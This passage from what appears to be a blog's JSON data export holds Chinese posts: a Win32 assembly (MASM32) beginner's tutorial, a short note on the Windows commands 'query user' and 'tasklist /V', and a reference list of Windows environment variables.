API函数名&#160;&#160;为了简化代码，也可以使用以下这种方式调用APIinvoke API函数名,参数1,参数2,.....,参数n","slug":"win32汇编快速入门","published":1,"updated":"2023-04-22T05:38:44.931Z","_id":"clgrjlxkd008p7opi4l3c2koj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>汇编可以开发WINDOWS程序？答案是肯定的，用WIN32汇编语言开发出来的WINDOWS程序具有执行效率高、占用空间小等特点。</p><strong>一、开发工具下载与安装</strong>&#160;&#160;在众多WIN32汇编开发工具中，MASM32笔者比较偏爱，它具有很多代码示例和丰富的开发资源，在下列下载地址中选择一个地址下载 MASM32。<br />http://www.pediy.com/tools/Compilers.htm<strong>二、知识预备</strong><strong>&#160;&#160;1、寄存器</strong><strong>&#160;&#160;&#160;</strong>为了提高运算速度和数据的存取速度，在计算机的CPU内，有一组硬件装置，第一个装置内存放CPU运算需要的 数，这些数值可供CPU直接存取，这组装置叫寄存器。寄存器分为通用寄存器、段寄存器、程序指针寄存器、标志寄存器。&#160;&#160;&#160;编程最常用就是通用寄存器，常用的通用寄存器有eax,ebx,ecx,edx,esi,edi等等，现代计算机的CPU一般是以32位 为单位进行运算，因此一个寄存器最大能存放32位的二进制数。每个寄存器通常都有它默认的用法，所谓默认只是一种编程的习惯，你可以不遵守这些用法，但是 有些情况下必须遵守，因为我们开发的是WINDOWS程序，要遵守WINDOWS操作系统的规定和汇编语法本身的约束，比如调用一个WINDOWSAPI 函数，返回值放在EAX，堆栈的栈顶地址在esp，在汇编语言的循环中，ECX内存放循环的次数。具体寄存器的使用会在以后介绍。<strong>&#160;&#160;2、堆栈</strong><strong>&#160;&#160;&#160;</strong>堆栈是个非常古老的概念，在DOS时代就有了，也是个非常重要的东西，程序没了它就活不了，堆栈就是在内存里分 配一个区域，使用这个区域必须遵守一个规定：后进先出，后进来的先出去，可以把它想像成一个空木箱，首先往里面放棉衣，然后往里面放书，最后放上运动服。 如果要取出书，必须得把最后放上的运动服取出，放的顺序是棉衣-&gt;书-&gt;运动服，取的顺序是运动服-&gt;书-&gt;棉衣，堆栈也是如 此。&#160;&#160;&#160;先解释一下什么是地址，内存价格的便宜和内存容量的扩大，WINDOWS虚拟内存早已出现，内存中放着众多的数据，必须要有方法表示内存 某个地点，这个地点就用地址来表示。把内存以字节为单位划分，某个地址表示某个字节的地址，如左下图是一个内有4个成员的堆栈，堆栈里的成员以一个字节为 单位（数的右边标明了以十六进制表示的地址，如1001）+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong><strong>&#160;&#160;</strong>堆栈是向下增长的，每增加一个成员，栈顶（堆栈顶部的地址）的地址减1，对于这个堆栈，栈顶地址是AF18，如果 再往这个堆栈里增加一个成员的话，它的地址是:AF18-1=AF17。如果往这个堆栈里增加一个32位的数，栈顶的地址是多少呢，32位的数占4个成员 的位置，栈顶的地址为：AF18-4=AF14。&#160;&#160;在这个堆栈中增加一个32位数DAB0CD90，新的堆栈如下：+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong>|DA|&#160;&#160; 地址:AF17+--+|B0|&#160;&#160; 地址：AF16+--+|CD|&#160;&#160; 地址：AF15+--+|90|&#160;&#160; 地址：AF14<strong>+--+&#160;</strong>&#160;&#160;&#160;如果从堆栈里拿走一个32位数，则栈顶的地址为：AF14+4=AF18三、WIN32汇编语言的语法&#160;  &#160;为了方便大家理解和入门，下面尽量使用宏汇编和伪指令地方进行描述，也正因为有了宏汇编和伪指令的帮助，WIN32汇编才具有很多高级语言的特性,很多 语法和C差不多。&#160; 1、WIN32汇编程序基本结构&#160;&#160; .386&#160;&#160; .MODEL Flat,STDCALL&#160;&#160; .DATA&#160;&#160;&#160;&#160;&#160;初始化值的全局变量定义&#160;&#160; .DATA?&#160;&#160;&#160;&#160;&#160;未初始化值的全局变量定义&#160;&#160;&#160;.CONST&#160;&#160;&#160;&#160;&#160;常量定义&#160;&#160; .CODE&#160;&#160;&#160;&#160;..............&#160;&#160;&#160;&#160;...............&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序入口LABEL&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;end程序入口LABEL2、变量定义&#160;&#160; （1）定义全局变量&#160;&#160;&#160;全局变量定义在.data和.data?内，&#160;&#160;&#160;初始化变量的定义方式如下：&#160;&#160;&#160;.data&#160;&#160;&#160;变量名&#160; 类型&#160; 初始值1,初始值2,.......&#160;&#160;&#160;变量名&#160; 类型&#160; 重复次数dup(初始值1,初始值2,....)&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:如果用?表示初始值的话,则表示0&#160;&#160;&#160;&#160;&#160;&#160;未初始化变量的定义方式是&#160;&#160;&#160;.data?&#160;&#160;&#160;&#160;变量名&#160; 类型 ?&#160;&#160;&#160;&#160;(2)条件测试语句&#160;&#160;&#160;(A)基本结构&#160;&#160;&#160; .IF条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;[.ELSEIF]条件比较&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;&#160;&#160;.......&#160;&#160;&#160;[.ELSE]&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;.ENDIF&#160;&#160;&#160;(3)操作符&#160;&#160;&#160;(A)比较操作符&#160;&#160;&#160;&#160;==&#160;相等&#160;&#160;&#160;!=&#160;&#160;不等于&#160;&#160;&#160;&gt;&#160;&#160; 大于&#160;&#160;&#160;&#160;&gt;=&#160;&#160;大于或等于&#160;&#160;&#160;&lt;&#160;&#160; 小于&#160;&#160;&#160;&#160;&lt;=&#160;&#160;小于或等于&#160;&#160;&#160;&amp;&#160;&#160; 位测试&#160;&#160;&#160;&#160;!&#160;&#160;逻辑非&#160;&#160;&#160;&amp;&amp;&#160; 逻辑与&#160;&#160;&#160;||&#160; 逻辑或&#160;&#160;&#160;(B)位操作符&#160;&#160;&#160;&#160;AND按位与&#160;&#160;&#160;OR&#160; 按位或&#160;&#160;&#160;XOR&#160;异或&#160;&#160;&#160; SHL逻辑左移&#160;&#160;&#160; SHR逻辑右移&#160;&#160;&#160;(C)标志寄存器操作符&#160;&#160;&#160; CARRY?是否进位&#160;&#160;&#160;OVERFLOW? 是否溢出&#160;&#160;&#160;PARITY?&#160; 奇偶位是否置位&#160;&#160;&#160;SIGN?&#160;&#160;&#160;符号位标志位是否被置位&#160;&#160;&#160;ZERO?&#160;&#160;&#160;零位标志位是否置位&#160;&#160; (4)循环语句&#160;&#160;(A)while语句&#160;&#160;while 条件&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;[.break[.if 退出条件]]&#160;&#160;&#160;[.contine[.if 退出条件]]]&#160;&#160;.end(B)repeat语句.repeat.....................[.break[.if 退出条件]][.contine[.if 退出条件]]].until 条件(或.untilcxz [条件])(5)子程序定义1、定义子程序名 proc [距离][语言类型][可视区域][USERS 寄存器列表][,参数:类型]...[VARARG]local  局部变量列表............................................子程序名 endp2、如果在未定义前使用，要声明、函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型,...............(6)数据结构(A)声明wndclass struct...............wndclass ends(B)定义mystruct wndclass&lt;1,1,...,1&gt;mystruct wndclass &lt;&gt;(C)使用mov eax,mystruct.lpfnwndproc&#160;mov esi,offset mystructassume esi: ptr WNDCLASSmov eax,[esi].lpfnwndproc&#160;.......assume esi:nothing四、在WIN32汇编中的使用WINDOWS API&#160;&#160;WIN32汇编如果没有API的帮助无法实现很多功能，笔者没见过在WIN32汇编程序不调用API的。&#160;&#160;调用API实际上是靠堆栈来完成参数传递的,既然是堆栈,那就要遵守后进先出的原则,这意味API的第一个参数是最后一个放入堆栈的,最后 一个参数是第一个放入堆栈的。&#160;&#160;&#160;&#160; 调用方式如下：push 参数n..........&#160;&#160;push 参数2p\nush 参数1call API函数名&#160;&#160;为了简化代码，也可以使用以下这种方式调用APIinvoke API函数名,参数1,参数2,.....,参数n","site":{"data":{}},"excerpt":"","more":"<p>汇编可以开发WINDOWS程序？答案是肯定的，用WIN32汇编语言开发出来的WINDOWS程序具有执行效率高、占用空间小等特点。</p><strong>一、开发工具下载与安装</strong>&#160;&#160;在众多WIN32汇编开发工具中，MASM32笔者比较偏爱，它具有很多代码示例和丰富的开发资源，在下列下载地址中选择一个地址下载 MASM32。<br />http://www.pediy.com/tools/Compilers.htm<strong>二、知识预备</strong><strong>&#160;&#160;1、寄存器</strong><strong>&#160;&#160;&#160;</strong>为了提高运算速度和数据的存取速度，在计算机的CPU内，有一组硬件装置，第一个装置内存放CPU运算需要的 数，这些数值可供CPU直接存取，这组装置叫寄存器。寄存器分为通用寄存器、段寄存器、程序指针寄存器、标志寄存器。&#160;&#160;&#160;编程最常用就是通用寄存器，常用的通用寄存器有eax,ebx,ecx,edx,esi,edi等等，现代计算机的CPU一般是以32位 为单位进行运算，因此一个寄存器最大能存放32位的二进制数。每个寄存器通常都有它默认的用法，所谓默认只是一种编程的习惯，你可以不遵守这些用法，但是 有些情况下必须遵守，因为我们开发的是WINDOWS程序，要遵守WINDOWS操作系统的规定和汇编语法本身的约束，比如调用一个WINDOWSAPI 函数，返回值放在EAX，堆栈的栈顶地址在esp，在汇编语言的循环中，ECX内存放循环的次数。具体寄存器的使用会在以后介绍。<strong>&#160;&#160;2、堆栈</strong><strong>&#160;&#160;&#160;</strong>堆栈是个非常古老的概念，在DOS时代就有了，也是个非常重要的东西，程序没了它就活不了，堆栈就是在内存里分 配一个区域，使用这个区域必须遵守一个规定：后进先出，后进来的先出去，可以把它想像成一个空木箱，首先往里面放棉衣，然后往里面放书，最后放上运动服。 如果要取出书，必须得把最后放上的运动服取出，放的顺序是棉衣-&gt;书-&gt;运动服，取的顺序是运动服-&gt;书-&gt;棉衣，堆栈也是如 此。&#160;&#160;&#160;先解释一下什么是地址，内存价格的便宜和内存容量的扩大，WINDOWS虚拟内存早已出现，内存中放着众多的数据，必须要有方法表示内存 某个地点，这个地点就用地址来表示。把内存以字节为单位划分，某个地址表示某个字节的地址，如左下图是一个内有4个成员的堆栈，堆栈里的成员以一个字节为 单位（数的右边标明了以十六进制表示的地址，如1001）+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong><strong>&#160;&#160;</strong>堆栈是向下增长的，每增加一个成员，栈顶（堆栈顶部的地址）的地址减1，对于这个堆栈，栈顶地址是AF18，如果 再往这个堆栈里增加一个成员的话，它的地址是:AF18-1=AF17。如果往这个堆栈里增加一个32位的数，栈顶的地址是多少呢，32位的数占4个成员 的位置，栈顶的地址为：AF18-4=AF14。&#160;&#160;在这个堆栈中增加一个32位数DAB0CD90，新的堆栈如下：+--+|AF|&#160;&#160; 地址:AF21+--+|03|&#160;&#160; 地址：AF20+--+|30|&#160;&#160; 地址：AF19+--+|F1|&#160;&#160; 地址：AF18<strong>+--+&#160;</strong>|DA|&#160;&#160; 地址:AF17+--+|B0|&#160;&#160; 地址：AF16+--+|CD|&#160;&#160; 地址：AF15+--+|90|&#160;&#160; 地址：AF14<strong>+--+&#160;</strong>&#160;&#160;&#160;如果从堆栈里拿走一个32位数，则栈顶的地址为：AF14+4=AF18三、WIN32汇编语言的语法&#160;  &#160;为了方便大家理解和入门，下面尽量使用宏汇编和伪指令地方进行描述，也正因为有了宏汇编和伪指令的帮助，WIN32汇编才具有很多高级语言的特性,很多 语法和C差不多。&#160; 1、WIN32汇编程序基本结构&#160;&#160; .386&#160;&#160; .MODEL Flat,STDCALL&#160;&#160; .DATA&#160;&#160;&#160;&#160;&#160;初始化值的全局变量定义&#160;&#160; .DATA?&#160;&#160;&#160;&#160;&#160;未初始化值的全局变量定义&#160;&#160;&#160;.CONST&#160;&#160;&#160;&#160;&#160;常量定义&#160;&#160; .CODE&#160;&#160;&#160;&#160;..............&#160;&#160;&#160;&#160;...............&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序入口LABEL&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;&#160;............&#160;&#160;&#160;&#160;end程序入口LABEL2、变量定义&#160;&#160; （1）定义全局变量&#160;&#160;&#160;全局变量定义在.data和.data?内，&#160;&#160;&#160;初始化变量的定义方式如下：&#160;&#160;&#160;.data&#160;&#160;&#160;变量名&#160; 类型&#160; 初始值1,初始值2,.......&#160;&#160;&#160;变量名&#160; 类型&#160; 重复次数dup(初始值1,初始值2,....)&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意:如果用?表示初始值的话,则表示0&#160;&#160;&#160;&#160;&#160;&#160;未初始化变量的定义方式是&#160;&#160;&#160;.data?&#160;&#160;&#160;&#160;变量名&#160; 类型 ?&#160;&#160;&#160;&#160;(2)条件测试语句&#160;&#160;&#160;(A)基本结构&#160;&#160;&#160; .IF条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;[.ELSEIF]条件比较&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;&#160;&#160;.......&#160;&#160;&#160;[.ELSE]&#160;&#160;&#160;&#160;&#160;&#160;&#160;程序代码&#160;&#160;&#160;&#160;.ENDIF&#160;&#160;&#160;(3)操作符&#160;&#160;&#160;(A)比较操作符&#160;&#160;&#160;&#160;==&#160;相等&#160;&#160;&#160;!=&#160;&#160;不等于&#160;&#160;&#160;&gt;&#160;&#160; 大于&#160;&#160;&#160;&#160;&gt;=&#160;&#160;大于或等于&#160;&#160;&#160;&lt;&#160;&#160; 小于&#160;&#160;&#160;&#160;&lt;=&#160;&#160;小于或等于&#160;&#160;&#160;&amp;&#160;&#160; 位测试&#160;&#160;&#160;&#160;!&#160;&#160;逻辑非&#160;&#160;&#160;&amp;&amp;&#160; 逻辑与&#160;&#160;&#160;||&#160; 逻辑或&#160;&#160;&#160;(B)位操作符&#160;&#160;&#160;&#160;AND按位与&#160;&#160;&#160;OR&#160; 按位或&#160;&#160;&#160;XOR&#160;异或&#160;&#160;&#160; SHL逻辑左移&#160;&#160;&#160; SHR逻辑右移&#160;&#160;&#160;(C)标志寄存器操作符&#160;&#160;&#160; CARRY?是否进位&#160;&#160;&#160;OVERFLOW? 是否溢出&#160;&#160;&#160;PARITY?&#160; 奇偶位是否置位&#160;&#160;&#160;SIGN?&#160;&#160;&#160;符号位标志位是否被置位&#160;&#160;&#160;ZERO?&#160;&#160;&#160;零位标志位是否置位&#160;&#160; (4)循环语句&#160;&#160;(A)while语句&#160;&#160;while 条件&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;&#160;..........&#160;&#160;&#160;[.break[.if 退出条件]]&#160;&#160;&#160;[.contine[.if 退出条件]]]&#160;&#160;.end(B)repeat语句.repeat.....................[.break[.if 退出条件]][.contine[.if 退出条件]]].until 条件(或.untilcxz [条件])(5)子程序定义1、定义子程序名 proc [距离][语言类型][可视区域][USERS 寄存器列表][,参数:类型]...[VARARG]local  局部变量列表............................................子程序名 endp2、如果在未定义前使用，要声明、函数名 proto [距离][语言][参数1]:数据类型,[参数2]:数据类型,...............(6)数据结构(A)声明wndclass struct...............wndclass ends(B)定义mystruct wndclass&lt;1,1,...,1&gt;mystruct wndclass &lt;&gt;(C)使用mov eax,mystruct.lpfnwndproc&#160;mov esi,offset mystructassume esi: ptr WNDCLASSmov eax,[esi].lpfnwndproc&#160;.......assume esi:nothing四、在WIN32汇编中的使用WINDOWS API&#160;&#160;WIN32汇编如果没有API的帮助无法实现很多功能，笔者没见过在WIN32汇编程序不调用API的。&#160;&#160;调用API实际上是靠堆栈来完成参数传递的,既然是堆栈,那就要遵守后进先出的原则,这意味API的第一个参数是最后一个放入堆栈的,最后 一个参数是第一个放入堆栈的。&#160;&#160;&#160;&#160; 调用方式如下：push 参数n..........&#160;&#160;push 参数2p\nush 参数1call API函数名&#160;&#160;为了简化代码，也可以使用以下这种方式调用APIinvoke API函数名,参数1,参数2,.....,参数n"},{"title":"windows下查看在线用户命令","date":"2012-01-13T01:38:00.000Z","_content":"<p>如果看不在管理员在不在线，遇到用户登录提示的软件就挂了。</p><p>光忘。</p><p>1.query &nbsp; user&nbsp;&nbsp;</p><p>2.tasklist /V 看进程信息，</p>","source":"_posts/windows下查看在线用户命令.md","raw":"title: windows下查看在线用户命令\ncategories: [Windows,操作系统]\ntags: []\ndate: 2012-01-13 09:38:00\n---\n<p>如果看不在管理员在不在线，遇到用户登录提示的软件就挂了。</p><p>光忘。</p><p>1.query &nbsp; user&nbsp;&nbsp;</p><p>2.tasklist /V 看进程信息，</p>","slug":"windows下查看在线用户命令","published":1,"updated":"2023-04-22T05:38:44.935Z","_id":"clgrjlxke008r7opibvq8feb8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>如果看不在管理员在不在线，遇到用户登录提示的软件就挂了。</p><p>光忘。</p><p>1.query &nbsp; user&nbsp;&nbsp;</p><p>2.tasklist /V 看进程信息，</p>","site":{"data":{}},"excerpt":"","more":"<p>如果看不在管理员在不在线，遇到用户登录提示的软件就挂了。</p><p>光忘。</p><p>1.query &nbsp; user&nbsp;&nbsp;</p><p>2.tasklist /V 看进程信息，</p>"},{"title":"WINDOWS系统路径变量","date":"2010-04-16T10:51:00.000Z","_content":"%systemdrive%%homepath%桌面 桌面路径<br />%HOMEDRIVE% = C: 当前启动的[系统]的所在分区<br />%SystemRoot% = C:WINDOWS 当前启动的[系统]的所在目录<br />%windir%=%SystemRoot% = C:WINDOWS 当前启动的[系统]的所在目录<br />%USERPROFILE%=C:Documents and Settingssihochina当前用户数据变量量%HOMEPATH% = C:Documents and Settingssihochina 当前用户环境变量<br />%system% = C:WINDOWSSYSTEM32<br />%ALLUSERSPROFILE% ：列出杏没rofile文件位置。<br />%APPDATA% :列出应用程序数据的默认存放位置。<br />%CD% :列出当前目录。<br />%CLIENTNAME% :列出联接到终端服务会话时客户端的NETBIOS名。<br />%CMDCMDLINE% :列出启动当前cmd.exe所使用的命令行。<br />%CMDEXTVERSION% :命令出当前命令处理程序扩展版本号。<br />%CommonProgramFiles% :列出了常用文件的文件夹路径。<br />%COMPUTERNAME% :列出了计算机名。<br />%COMSPEC% :列出了可执行命令外壳（命令处理程序）的路径。<br />%DATE% :列出当前日期。<br />%ERRORLEVEL% :列出了最近使用的命令的错误代码。<br />%HOMEDRIVE% :列出与用户主目录所在的驱动器盘符。<br />%HOMEPATH% :列出用户主目录的完整路径。<br />%HOMESHARE% :列出用户共享主目录的网络路径。<br />%LOGONSEVER% :列出有效的当前登录会话的域名控制器名。<br />%NUMBER_OF_PROCESSORS% :列出了计算机安装的处理器数。<br />%OS% :列出操作[系统]的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)<br />%Path% :列出了可执行文件的搜索路径。<br />%PATHEXT% :列出操作[系统]认为可被执行的文件扩展名。<br />%PROCESSOR_ARCHITECTURE% :列出了处理器的芯片架构。<br />%PROCESSOR_IDENTFIER% :列出了处理器的描述。<br />%PROCESSOR_LEVEL% :列出了计算机的处理器的型号。<br />%PROCESSOR_REVISION% :列出了处理器的修订号。<br />%ProgramFiles% :列出了Program Files文件夹的路径。<br />%PROMPT% :列出了当前命令解释器的命令提示设置。<br />%RANDOM% :列出界于0 和 32767之间的随机十进制数。<br />%SESSIONNAME% :列出连接到终端服务会话时的连接和会话名。<br />%SYSTEMDRIVE% :列出了Windows启动目录所在驱动器。<br />%SYSTEMROOT% :列出了Windows启动目录的位置。<br />%TEMP% and %TMP% :列出了当前登录的用户可用应用程序的默认临时目录。<br />%TIME% :列出当前时间。<br />%USERDOMAIN% :列出了包含用户帐号的域的名字。<br />%USERNAME% :列出当前登录的用户的名字。<br />%USERPROFILE% :列出当前用户Profile文件位置。<br />%WINDIR% :列出操作[系统]目录的位置。<br />%ALLUSERSPROFILE%&#160;&#160; [本地] 返回“所有用户”配置文件的位置。<br />%APPDATA% [本地]返回默认情况下应用程序存储数据的位置。<br />%CD% [本地] 返回当前目录字符串。<br />%CMDCMDLINE% [本地] 返回用来启动当前的 Cmd.exe 的准确命令行。<br />%CMDEXTVERSION% [系统] 返回当前的“命令处理程序扩展”的版本号。<br />%COMPUTERNAME%&#160;&#160; [系统] 返回计算机的名称。<br />%COMSPEC%&#160;&#160; [系统] 返回命令行解释器可执行程序的准确路径。<br />%DATE%&#160;&#160; [系统] 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。<br />%ERRORLEVEL%&#160;&#160; [系统] 返回上一条命令的错误代码。通常用非零值表示错误。<br />%HOMEDRIVE%&#160;&#160; [系统] 返回连接到用户主目录的[本地]工作站驱动器号。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMEPATH%&#160; [系统] 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMESHARE% [系统] 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%LOGONSERVER% [本地] 返回验证当前登录会话的域控制器的名称。<br />%NUMBER_OF_PROCESSORS%&#160;&#160; [系统] 指定安装在计算机上的处理器的数目。<br />%OS%[系统] 返回操作[系统]名称。Windows 2000 显示其操作[系统]为 Windows_NT。<br />%PATH%[系统] 指定可执行文件的搜索路径。<br />%PATHEXT% [系统] 返回操作[系统]认为可执行的文件扩展名的列表。<br />%PROCESSOR_ARCHITECTURE%&#160;&#160; [系统] 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。<br />%PROCESSOR_IDENTFIER% [系统] 返回处理器说明。<br />%PROCESSOR_LEVEL%[系统] 返回计算机上安装的处理器的型号。<br />%PROCESSOR_REVISION% [系统] 返回处理器的版本号。<br />%PROMPT% [本地] 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。<br />%RANDOM% [系统] 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。<br />%SYSTEMDRIVE% [系统] 返回包含 Windows server operating system 根目录（即[系统]根目录）的驱动器。<br />%SYSTEMROOT%[系统] 返回 Windows server operating system 根目录的位置。<br />%TEMP% 和 %TMP% [系统]和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。<br />%TIME% [系统] 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。<br />%USERDOMAIN% [本地] 返回包含用户帐户的域的名称。<br />%USERNAME% [本地] 返回当前登录的用户的名称。<br />%USERPROFILE% [本地] 返回当前用户的配置文件的位置。<br />%WINDIR% [系统] 返回操作[系统]目录的位置。<br />%temp%=%USERPROFILE%Local SettingsTemp=C:Documents andSettingssihochinaLocal SettingsTemp当前用户TEMP缓存变量","source":"_posts/WINDOWS系统路径变量.md","raw":"title: WINDOWS系统路径变量\ncategories: [Windows,操作系统]\ntags: []\ndate: 2010-04-16 18:51:00\n---\n%systemdrive%%homepath%桌面 桌面路径<br />%HOMEDRIVE% = C: 当前启动的[系统]的所在分区<br />%SystemRoot% = C:WINDOWS 当前启动的[系统]的所在目录<br />%windir%=%SystemRoot% = C:WINDOWS 当前启动的[系统]的所在目录<br />%USERPROFILE%=C:Documents and Settingssihochina当前用户数据变量量%HOMEPATH% = C:Documents and Settingssihochina 当前用户环境变量<br />%system% = C:WINDOWSSYSTEM32<br />%ALLUSERSPROFILE% ：列出杏没rofile文件位置。<br />%APPDATA% :列出应用程序数据的默认存放位置。<br />%CD% :列出当前目录。<br />%CLIENTNAME% :列出联接到终端服务会话时客户端的NETBIOS名。<br />%CMDCMDLINE% :列出启动当前cmd.exe所使用的命令行。<br />%CMDEXTVERSION% :命令出当前命令处理程序扩展版本号。<br />%CommonProgramFiles% :列出了常用文件的文件夹路径。<br />%COMPUTERNAME% :列出了计算机名。<br />%COMSPEC% :列出了可执行命令外壳（命令处理程序）的路径。<br />%DATE% :列出当前日期。<br />%ERRORLEVEL% :列出了最近使用的命令的错误代码。<br />%HOMEDRIVE% :列出与用户主目录所在的驱动器盘符。<br />%HOMEPATH% :列出用户主目录的完整路径。<br />%HOMESHARE% :列出用户共享主目录的网络路径。<br />%LOGONSEVER% :列出有效的当前登录会话的域名控制器名。<br />%NUMBER_OF_PROCESSORS% :列出了计算机安装的处理器数。<br />%OS% :列出操作[系统]的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)<br />%Path% :列出了可执行文件的搜索路径。<br />%PATHEXT% :列出操作[系统]认为可被执行的文件扩展名。<br />%PROCESSOR_ARCHITECTURE% :列出了处理器的芯片架构。<br />%PROCESSOR_IDENTFIER% :列出了处理器的描述。<br />%PROCESSOR_LEVEL% :列出了计算机的处理器的型号。<br />%PROCESSOR_REVISION% :列出了处理器的修订号。<br />%ProgramFiles% :列出了Program Files文件夹的路径。<br />%PROMPT% :列出了当前命令解释器的命令提示设置。<br />%RANDOM% :列出界于0 和 32767之间的随机十进制数。<br />%SESSIONNAME% :列出连接到终端服务会话时的连接和会话名。<br />%SYSTEMDRIVE% :列出了Windows启动目录所在驱动器。<br />%SYSTEMROOT% :列出了Windows启动目录的位置。<br />%TEMP% and %TMP% :列出了当前登录的用户可用应用程序的默认临时目录。<br />%TIME% :列出当前时间。<br />%USERDOMAIN% :列出了包含用户帐号的域的名字。<br />%USERNAME% :列出当前登录的用户的名字。<br />%USERPROFILE% :列出当前用户Profile文件位置。<br />%WINDIR% :列出操作[系统]目录的位置。<br />%ALLUSERSPROFILE%&#160;&#160; [本地] 返回“所有用户”配置文件的位置。<br />%APPDATA% [本地]返回默认情况下应用程序存储数据的位置。<br />%CD% [本地] 返回当前目录字符串。<br />%CMDCMDLINE% [本地] 返回用来启动当前的 Cmd.exe 的准确命令行。<br />%CMDEXTVERSION% [系统] 返回当前的“命令处理程序扩展”的版本号。<br />%COMPUTERNAME%&#160;&#160; [系统] 返回计算机的名称。<br />%COMSPEC%&#160;&#160; [系统] 返回命令行解释器可执行程序的准确路径。<br />%DATE%&#160;&#160; [系统] 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。<br />%ERRORLEVEL%&#160;&#160; [系统] 返回上一条命令的错误代码。通常用非零值表示错误。<br />%HOMEDRIVE%&#160;&#160; [系统] 返回连接到用户主目录的[本地]工作站驱动器号。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMEPATH%&#160; [系统] 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%HOMESHARE% [系统] 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“[本地]用户和组”中指定的。<br />%LOGONSERVER% [本地] 返回验证当前登录会话的域控制器的名称。<br />%NUMBER_OF_PROCESSORS%&#160;&#160; [系统] 指定安装在计算机上的处理器的数目。<br />%OS%[系统] 返回操作[系统]名称。Windows 2000 显示其操作[系统]为 Windows_NT。<br />%PATH%[系统] 指定可执行文件的搜索路径。<br />%PATHEXT% [系统] 返回操作[系统]认为可执行的文件扩展名的列表。<br />%PROCESSOR_ARCHITECTURE%&#160;&#160; [系统] 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。<br />%PROCESSOR_IDENTFIER% [系统] 返回处理器说明。<br />%PROCESSOR_LEVEL%[系统] 返回计算机上安装的处理器的型号。<br />%PROCESSOR_REVISION% [系统] 返回处理器的版本号。<br />%PROMPT% [本地] 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。<br />%RANDOM% [系统] 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。<br />%SYSTEMDRIVE% [系统] 返回包含 Windows server operating system 根目录（即[系统]根目录）的驱动器。<br />%SYSTEMROOT%[系统] 返回 Windows server operating system 根目录的位置。<br />%TEMP% 和 %TMP% [系统]和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。<br />%TIME% [系统] 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。<br />%USERDOMAIN% [本地] 返回包含用户帐户的域的名称。<br />%USERNAME% [本地] 返回当前登录的用户的名称。<br />%USERPROFILE% [本地] 返回当前用户的配置文件的位置。<br />%WINDIR% [系统] 返回操作[系统]目录的位置。<br />%temp%=%USERPROFILE%Local SettingsTemp=C:Documents andSettingssihochinaLocal SettingsTemp当前用户TEMP缓存变量","slug":"WINDOWS系统路径变量","published":1,"updated":"2023-04-22T05:38:44.710Z","_id":"clgrjlxkf008t7opiemmybotp","comments":1,"layout":"post","photos":[],"link":"","content":"<p>%systemdrive%%homepath%桌面 桌面路径<br />%HOMEDRIVE% &#x3D; C: 当前启动的[系统]的所在分区<br />%SystemRoot% &#x3D; C:WINDOWS 当前启动的[系统]的所在目录<br />%windir%&#x3D;%SystemRoot% &#x3D; C:WINDOWS 当前启动的[系统]的所在目录<br />%USERPROFILE%&#x3D;C:Documents and Settingssihochina当前用户数据变量量%HOMEPATH% &#x3D; C:Documents and Settingssihochina 当前用户环境变量<br />%system% &#x3D; C:WINDOWSSYSTEM32<br />%ALLUSERSPROFILE% ：列出杏没rofile文件位置。<br />%APPDATA% :列出应用程序数据的默认存放位置。<br />%CD% :列出当前目录。<br />%CLIENTNAME% :列出联接到终端服务会话时客户端的NETBIOS名。<br />%CMDCMDLINE% 